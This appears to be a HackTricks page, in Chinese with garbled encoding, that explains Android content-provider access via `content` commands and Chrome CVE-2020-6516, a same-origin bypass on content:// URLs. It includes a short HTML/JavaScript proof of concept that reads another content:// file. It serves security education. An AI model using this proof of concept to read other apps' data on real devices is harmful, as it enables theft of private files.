<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ç›´è‡³æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


è¦è¯•éªŒå†…å®¹æä¾›è€…ï¼Œå¯ä»¥åœ¨Androidè®¾å¤‡ä¸Šä½¿ç”¨`content`å‘½ä»¤ã€‚ä¸ä¸€å®šéœ€è¦æ ¹è®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œè¦æŸ¥çœ‹ç”±åª’ä½“å­˜å‚¨ç®¡ç†çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```bash
$ content query --uri content://media/external/file
```
ä¸ºäº†ä½¿è¾“å‡ºæ›´åŠ äººæ€§åŒ–ï¼Œå¯ä»¥å°†æ˜¾ç¤ºçš„åˆ—é™åˆ¶ä¸ºæ¯ä¸ªç´¢å¼•æ–‡ä»¶çš„æ ‡è¯†ç¬¦å’Œè·¯å¾„ã€‚
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
åª’ä½“æä¾›è€…å­˜åœ¨äºå®ƒä»¬è‡ªå·±çš„ç§æœ‰å‘½åç©ºé—´ä¸­ã€‚å¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œè¦è®¿é—®å†…å®¹æä¾›è€…ï¼Œåº”æŒ‡å®šç›¸åº”çš„`content://` URIã€‚é€šå¸¸ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹åº”ç”¨ç¨‹åºæ¸…å•ï¼ˆå¦‚æœå†…å®¹æä¾›è€…ç”±åº”ç”¨ç¨‹åºå¯¼å‡ºï¼‰æˆ–Androidæ¡†æ¶çš„æºä»£ç æ¥æ¢å¤å¯ä»¥è®¿é—®æä¾›è€…çš„è·¯å¾„ä¿¡æ¯ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œåœ¨Androidè®¾å¤‡ä¸Šï¼ŒChromeæ”¯æŒé€šè¿‡`content://`æ–¹æ¡ˆè®¿é—®å†…å®¹æä¾›è€…ã€‚æ­¤åŠŸèƒ½å…è®¸æµè§ˆå™¨è®¿é—®ç”±ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå¯¼å‡ºçš„èµ„æºï¼ˆä¾‹å¦‚ç…§ç‰‡ã€æ–‡æ¡£ç­‰ï¼‰ã€‚ä¸ºäº†éªŒè¯è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨åª’ä½“å­˜å‚¨ä¸­æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰æ¡ç›®ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨è®¿é—®å®ƒï¼š
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
è¦å‘ç°æ–°æ’å…¥æ–‡ä»¶çš„æ ‡è¯†ç¬¦ï¼š
```bash
$ content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
```markdown
è¦åœ¨Chromeä¸­æŸ¥çœ‹æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å›¾æ‰€ç¤ºçš„URLã€‚è¯·æ³¨æ„æ–‡ä»¶æ ‡è¯†ç¬¦747ï¼ˆå¦‚ä¸Šæ‰€å‘ç°ï¼‰ï¼Œå®ƒè¢«ç”¨ä½œURLçš„åç¼€ã€‚

![Chrome "ä½ å¥½ï¼Œä¸–ç•Œï¼"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥åˆ—å‡ºä¸WhatsAppç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ï¼š
```
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## Chrome CVE-2020-6516 åŒæºç­–ç•¥ç»•è¿‡ <a href="#cve-2020-6516" id="cve-2020-6516"></a>

æµè§ˆå™¨ä¸­çš„ _åŒæºç­–ç•¥_ (SOP) \[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)] è§„å®šï¼ŒURL Açš„Javascriptå†…å®¹åªèƒ½è®¿é—®URL Bçš„å†…å®¹ï¼Œå¦‚æœAå’ŒBçš„ä»¥ä¸‹URLå±æ€§ä¿æŒç›¸åŒï¼š

* åè®®ï¼Œä¾‹å¦‚ `https` å¯¹æ¯” `http`
* åŸŸåï¼Œä¾‹å¦‚ `www.example1.com` å¯¹æ¯” `www.example2.com`
* ç«¯å£ï¼Œä¾‹å¦‚ `www.example1.com:8080` å¯¹æ¯” `www.example1.com:8443`

å½“ç„¶ï¼Œä¸Šè¿°è§„åˆ™æœ‰ä¾‹å¤–ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹ï¼Œ`https://www.example1.com` çš„èµ„æºï¼ˆä¾‹å¦‚ä¸€æ®µJavascriptä»£ç ï¼‰ä¸èƒ½è®¿é—® `https://www.example2.com` ä¸Šçš„èµ„æºçš„DOMï¼Œå› ä¸ºè¿™ä¼šå¼•å…¥ä¸¥é‡çš„ä¿¡æ¯æ³„éœ²ã€‚**é™¤éè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰ç­–ç•¥æ˜ç¡®å…è®¸ï¼Œå¦åˆ™ç½‘é¡µèµ„æºä¸åº”è¯¥èƒ½ç»•è¿‡SOPè§„åˆ™ã€‚**

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒChromeè®¤ä¸º `content://` æ˜¯ä¸€ä¸ª _æœ¬åœ°æ–¹æ¡ˆ_ï¼Œå°±åƒ `file://` ä¸€æ ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒSOPè§„åˆ™æ›´åŠ ä¸¥æ ¼ï¼Œå› ä¸ºæ¯ä¸ªæœ¬åœ°æ–¹æ¡ˆURLéƒ½è¢«è§†ä¸ºä¸€ä¸ªç‹¬ç«‹çš„æºã€‚ä¾‹å¦‚ï¼Œ**file:///tmp/test.html** ä¸­çš„Javascriptä»£ç ä¸åº”è¯¥èƒ½å¤Ÿè®¿é—® **file:///tmp/test2.html** çš„å†…å®¹ï¼Œæˆ–è€…è¯´ä»»ä½•å…¶ä»–æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚**å› æ­¤ï¼Œæ ¹æ®SOPè§„åˆ™ï¼Œé€šè¿‡ `content://` åŠ è½½çš„èµ„æºä¸åº”è¯¥èƒ½å¤Ÿè®¿é—®ä»»ä½•å…¶ä»– `content://` èµ„æºã€‚** å—¯ï¼ŒChromeçš„CVE-2020-6516æ¼æ´ä¸ºè¿™æ¡è§„åˆ™åˆ›é€ äº†ä¸€ä¸ªâ€œä¾‹å¤–â€ã€‚

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)] æ˜¯ä¸€ä¸ªåœ¨é€šè¿‡ `content://` URLåŠ è½½çš„èµ„æºä¸Šçš„SOPç»•è¿‡ã€‚**ä¾‹å¦‚ï¼Œä» `content://com.example.provider/test.html` åŠ è½½çš„HTMLæ–‡æ¡£ä¸­è¿è¡Œçš„Javascriptä»£ç ï¼Œå¯ä»¥åŠ è½½å¹¶è®¿é—®é€šè¿‡ `content://` URLåŠ è½½çš„ä»»ä½•å…¶ä»–èµ„æºã€‚** è¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„æ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡ŒAndroid 9æˆ–ä¹‹å‰ç‰ˆæœ¬çš„Androidè®¾å¤‡ä¸Šã€‚åœ¨è¿™äº›è®¾å¤‡ä¸Šæ²¡æœ‰å®ç°ä½œç”¨åŸŸå­˜å‚¨ \[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)]ï¼Œå› æ­¤ï¼Œä½äº **/sdcard** ä¸‹çš„åº”ç”¨ç‰¹å®šæ•°æ®ï¼Œæ›´æœ‰è¶£çš„æ˜¯ä½äº **/sdcard/Android** ä¸‹çš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡ç³»ç»Ÿçš„åª’ä½“å­˜å‚¨å†…å®¹æä¾›è€…è®¿é—®ã€‚

æ¦‚å¿µéªŒè¯ç›¸å½“ç›´æ¥ã€‚ä¸€ä¸ªä½¿ç”¨ `XMLHttpRequest` è®¿é—®ä»»æ„ `content://` URLsçš„HTMLæ–‡æ¡£è¢«ä¸Šä¼ åˆ° **/sdcard** ä¸‹ã€‚ç„¶åå®ƒè¢«æ·»åŠ åˆ°åª’ä½“å­˜å‚¨ä¸­ï¼Œå¹¶ä»¥ç±»ä¼¼äºå‰é¢å±•ç¤ºçš„ç¤ºä¾‹çš„æ–¹å¼åœ¨Chromeä¸­æ¸²æŸ“ã€‚ä¸ºäº†æ¼”ç¤ºç›®çš„ï¼Œå¯ä»¥å°è¯•åŠ è½½ `content://media/external/file/747`ï¼Œå®é™…ä¸Šï¼Œè¿™æ˜¯"Hello, world!"ç¤ºä¾‹çš„åª’ä½“å­˜å‚¨URLã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œè¿è¡Œåœ¨HTMLæ–‡æ¡£æºä¸­çš„Javascriptä»£ç å°†è·å–å¹¶æ˜¾ç¤º **test.txt** çš„å†…å®¹ã€‚
```markup
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
**ä»è¿™ç¯‡æ–‡ç« ä¸­è·å–çš„ä¿¡æ¯ï¼š** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
